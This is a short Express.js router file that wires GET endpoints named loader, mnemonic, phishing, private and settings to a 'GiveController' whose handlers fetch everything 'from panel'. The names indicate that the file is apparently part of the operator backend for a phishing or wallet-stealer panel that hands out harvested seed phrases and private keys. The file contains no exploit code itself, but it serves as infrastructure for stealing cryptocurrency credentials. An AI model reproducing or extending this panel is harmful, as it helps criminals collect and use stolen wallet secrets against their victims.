const Router = require('express');
const router = new Router();

const GiveController = require('../controller/GiveController');

router.get('/loader', GiveController.GetAllFromPanelLoader);
router.get('/mnemonic', GiveController.GetAllFromPanelMnemonic);
router.get('/phishing', GiveController.GetAllFromPanelPhishing);
router.get('/private', GiveController.GetAllFromPanelPrivate);
router.get('/settings', GiveController.GetPanelSettingsById);

module.exports = router;